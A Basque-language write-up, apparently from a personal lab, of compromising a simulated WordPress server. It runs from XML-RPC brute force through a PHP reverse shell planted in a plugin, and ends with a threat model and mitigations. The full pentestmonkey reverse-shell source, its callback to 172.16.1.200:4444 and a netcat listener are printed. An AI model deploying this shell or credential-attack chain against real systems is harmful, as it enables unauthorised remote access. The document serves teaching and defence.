# RedPi - TechNovaren web zerbitzariaren konpromisoa

**Ingurunea:** norberaren laborategia · **Helburua:** DMZ-ko web zerbitzaria (10.0.0.10) · **Xedea:** web zerbitzarian shell bat lortzea, RedPi auditoria-makina erabiltzen

**RedPi** proiektuaren parte da, TechNovaren enpresa sare simulatu bat
(LAN / DMZ / WAN), Python-eko tresna propioekin auditatua. Writeup honek
kate ofentsiboa hasieratik amaiera arte erakusten du, RedPi makinatik
(VPN bidez konektatua) DMZ-ko web zerbitzariko shell bateraino, nire tresnak
erabiliz.

## Errekonozimendua

RedPitik DMZ-a nire sare-eskaner propioarekin (nmap-en oinarritua) eskaneatu nuen:

```
Host: 10.0.0.10
21/tcp  open  ftp   vsftpd 3.0.5
22/tcp  open  ssh   OpenSSH 8.2p1
80/tcp  open  http  Apache 2.4.41
```

80. portuan Apache zerbitzari bat, FTP zerbitzuarekin: 80. portuak WordPress gune
bat zerbitzatzen du, eta hori bihurtzen da erasorako gainazalik interesgarriena.

![DMZ-ren eskaneoa RedPi-tik: web-zerbitzaria 10.0.0.10-ean](writeups/redpi/img/01-recon-scan.png)

## Web enumerazioa

Nire web-analisi tresnak ohiko rutak fuzzing bidez aztertzen ditu. Aurkitu dudan ruta
interesgarriak:

```
[200] /wp-admin
[200] /wp-login.php
[200] /wp-json/wp/v2/users
[405] /xmlrpc.php
[200] /readme.html
```

Bik nabarmentzen dira: `wp-json/wp/v2/users` eta `xmlrpc.php`, biak lehenetsita
agertzen dira WordPress instalazio estandar batean.

![Web fuzzing-a: wp-json eta xmlrpc.php lehenetsita agerian](writeups/redpi/img/02-web-fuzzing.png)

## Erabiltzaileen enumerazioa

`/wp-json/wp/v2/users`-ek egileen zerrenda filtratzen du, `admin` kontuaren
erabiltzaile izena itzultzen du. WordPress-ek endpoint hau lehenetsita erakusten du, eta
erasotzaileari baliozko erabiltzaile izen bat oparitzen dio hasteko.

![wp-json/wp/v2/users admin erabiltzailea filtratzen](writeups/redpi/img/03-wpjson-user-enum.png)

## XML-RPC-ri indar basatia

`xmlrpc.php`-k `wp.getUsersBlogs` metodoa onartzen du, eta horrek kredentzialak
login formularioaz kanpo eta mugarik gabe probatzeko aukera ematen du. Nire
XML-RPC indar basatizko tresnak hiztegi bat probatzen du `admin` erabiltzailearen
aurka:

```
[*] 7 pasahitz probatzen http://10.0.0.10/xmlrpc.php aurka
[+] Baliozko kredentzialak: admin:7ujm8ik,9ol.
```

Kredentzialak lortuta.

![XML-RPC-ri indar basatia admin-en kredentzialak berreskuratzen](writeups/redpi/img/04-xmlrpc-bruteforce.png)

Datu garrantzitsu bat: `system.multicall` metodoa WordPressen `xmlrpc.php`-ren aurkako eraso masibo errealen atzean dago, ehunka login saiakera HTTP eskaera bakarrean bildu ditzake, eskaerako abiadura-mugaketa saihestuz eta mila log-lerroren ordez bat utziz. Nire tresnak saiakera bat eskaerako metodo sinplea erabiltzen du, kontu bakar baterako aski dena, baina defentsa erreal batek multicall kontuan izan behar du, WAF edo fail2ban-ek saiakera errealak baino askoz ere gertaera gutxiago ikusten ditu.

## Sarbidea eta foothold-a

`admin`-en pasahitzarekin `/wp-admin`-en saioa hasi nuen. Plugin-editorea
paneletik eskuragarri zegoen, orduan **Hello Dolly** plugin inaktiboaren kodea
PHP reverse shell batekin ordezkatu nuen, RedPi-ra 4444 portura apuntatuz.

Payload-a pentestmonkey-en PHP reverse shell klasikoa da, aldaketarik gabe, `fsockopen()` RedPi-ren listenerrekin konektatzen da (172.16.1.200:4444), eta `sh -i` `proc_open()` bidez abiarazten da stdin/stdout/stderr pipe-etan:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.16.1.200';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Listener bat jarri nuen entzuten RedPi makinan Netcat erabiliz:

```bash
nc -nlvp 4444
```

Plugina aktibatzean (eta orria birkargatzean) konexioa abiarazi zen:

```
Connection received on 10.0.0.10
$ id
uid=33(www-data) gid=33(www-data)
$ pwd
/var/www/html/wordpress/wp-admin
```

Shell-a `www-data` erabiltzailean DMZ-ko web zerbitzarian. Helburua beteta.

![wp-admin-en saioa berreskuratutako kredentzialekin](writeups/redpi/img/05-wpadmin-login.png)

![PHP reverse shell-a Hello Dolly plugin-ean itsatsita](writeups/redpi/img/06-plugin-reverse-shell.png)

![Reverse shell-a RedPi-n jasota: www-data shell-a](writeups/redpi/img/07-shell-www-data.png)

Hemendik aurrera, kontratazio erreal batek pribilegio-igoerara joko luke: `sudo -l`, SUID bitarrak, gaitasunak eta kernelaren bertsioa aztertuz `www-data` shell-etik. Horrek lab honen helburutik kanpo geratzen da, baina hurrengo fase naturala da.

## Erasoaren jatorriari buruzko oharra (mehatxu-eredua)

Reverse shell-ari buruzko xehetasun garrantzitsu bat: **emaitza erasoa nondik
abiarazten den araberakoa da.**

- Kasu honetan, katea **RedPitik abiarazi nuen, barneko LANean kokatua** (VPN
  bidez konektatua, OpenVPN tunelaren bidez). Suebakiak zonak segmentatzen ditu
  eta DMZ->LAN trafikoa blokeatzen du, beraz, itzulerako konexioa ez zen iristen.
  Ariketa osatzeko, aldi baterako arau bat gehitu nuen, 4444 ataka DMZ-tik
  RedPira baimenduz. Honek **barneko erasotzaile** baten kasua simulatzen du
  (edo sarean sartuta dagoen ziberkiminal talde batena).
- **Kanpoko erasotzaile** erreal batek, ziberkriminal ohikoaren kasua, reverse
  shell-a bere kontrolpeko makina batera apuntatuko luke **Interneten (WAN)**, ez
  empresaren LANean. Kasu horretan, trafikoa DMZ-tik kanpora aterako litzateke, normalean
  baimenduta dagoen norabidea, eta **ez litzateke suebakia ukitu beharko**.

Hau da, arauaren beharra ez da eraso katearen ahulezia bat, barnetik erasotzearen
ondorio bat da. LAN/DMZ segmentazioak *ondo* egiten du bere lana, barne sarerako
mugimendua geldituz, geldiarazten ez duena DMZ-tik Internetera doan irteerako
trafikoa da, eta hortik joan egingo luke zibereraso erreal batek.

## Neurriak (mitigazioa)

Katea hainbat konfigurazio lehenetsi, gaizki ezarri edo ahulengatik funtzionatu
zuen. Gomendioak, eraginik handienetik txikienera:

- **Pasahitz sendoak + MFA**, `admin:7ujm8ik,9ol.` hiztegi txiki batekin erori zen;
  konpromiso osoaren sustraia da.
- **Plugin/gai editorea desgaitu**, `DISALLOW_FILE_EDIT` ezarri `wp-config.php`-n,
  konprometitutako admin batek kodea injektatu ezin dezan.
- **`xmlrpc.php` desgaitu edo mugatu**, saiakera-mugarik gabeko indar basatirik onartzen du (eta `system.multicall`-ek saiakerak biderkatzen ditu eskaerako).
- **`wp-json`-eko erabiltzaile-enumerazioa murriztu**, ez oparitu baliozko
  erabiltzaile-izenak erasotzaileari.
- **fail2ban / WAF** indar basatia gelditzeko, eskaeren gorputza ere aztertuz, eskaerak zenbatzea ez da aski `system.multicall`-en aurrean, eta web-zerbitzuaren konturako gutxieneko pribilegioa.
- **DMZ-ko irteerako iragazketa (egress filtering)**, web zerbitzariaren irteerako
  konexioak murrizteak reverse shell-a hiltzen du, kanpoko erasotzaile batengandik
  ere.

> Nire laborategiaren auditoretza baimendua. Pasahitz ahula nahita eta helburu
> didaktikoarekin dago.
